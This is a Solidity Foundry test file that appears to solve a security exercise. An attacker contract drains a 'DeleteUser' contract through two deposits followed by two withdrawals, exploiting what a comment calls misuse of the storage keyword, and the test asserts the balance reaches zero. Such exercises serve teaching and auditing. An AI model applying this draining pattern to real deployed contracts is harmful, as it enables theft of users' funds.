// SPDX-License-Identifier: MIT

import {Test, console} from "forge-std/Test.sol";
import {DeleteUser} from "../src/DeleteUser.sol";

pragma solidity ^0.8.0;

contract DeleteUserTest is Test {
    DeleteUser deleteUser;

    address public victim = makeAddr("victim");
    address public attacker = makeAddr("attacker");

    function setUp() public {
        deleteUser = new DeleteUser();
        hoax(victim, 10 ether);
        deleteUser.deposit{value: 1 ether}();
        vm.deal(attacker, 1 ether);
    }

    function testDeleteUser() public {
        uint256 currentNonce = vm.getNonce(attacker);

        // attack here
        console.log(address(deleteUser).balance);
        vm.prank(attacker);
        new DeleteUserAttacker{value: 1 ether}(deleteUser);
        console.log(address(deleteUser).balance);
        assertEq(address(deleteUser).balance, 0);
        assertEq(vm.getNonce(attacker), currentNonce + 1);
    }
}

contract DeleteUserAttacker {
    DeleteUser public target;

    // the storage keyword is misused, so it can be manipulated

    constructor(DeleteUser _target) payable {
        target = DeleteUser(_target);

        // First deposit
        target.deposit{value: 1 ether}();

        // Second deposit
        target.deposit();

        // First withdraw
        target.withdraw(1);

        // Second withdraw
        target.withdraw(1);
    }
}
